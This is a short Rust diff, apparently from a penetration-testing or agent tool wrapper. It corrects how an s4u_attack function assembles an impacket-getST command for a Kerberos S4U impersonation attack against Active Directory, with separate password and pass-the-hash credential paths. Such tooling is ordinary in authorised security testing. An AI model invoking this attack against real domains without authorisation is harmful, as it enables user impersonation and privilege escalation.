@@ -47,15 +47,24 @@ pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
     let impersonate = required_str(args, "impersonate")?;
     let dc_ip = optional_str(args, "dc_ip");
 
-    let (target_str, extra_args) =
-        credentials::impacket_auth(Some(domain), username, password, hash, domain);
-
+    // getST.py expects `domain/user:pass` or `domain/user -hashes :hash`
+    // — no `@target` suffix (unlike secretsdump/wmiexec). The DC is
+    // specified via `-dc-ip` instead.
     let mut cmd = CommandBuilder::new("impacket-getST")
         .flag("-spn", target_spn)
-        .flag("-impersonate", impersonate)
-        .arg(target_str)
-        .args(extra_args)
-        .timeout_secs(120);
+        .flag("-impersonate", impersonate);
+
+    if let Some(h) = hash {
+        cmd = cmd
+            .arg(format!("{domain}/{username}"))
+            .args(credentials::hash_args(h));
+    } else if let Some(p) = password {
+        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
+    } else {
+        anyhow::bail!("s4u_attack requires either password or hash");
+    }
+
+    cmd = cmd.timeout_secs(120);
 
     cmd = cmd.flag_opt("-dc-ip", dc_ip);
 
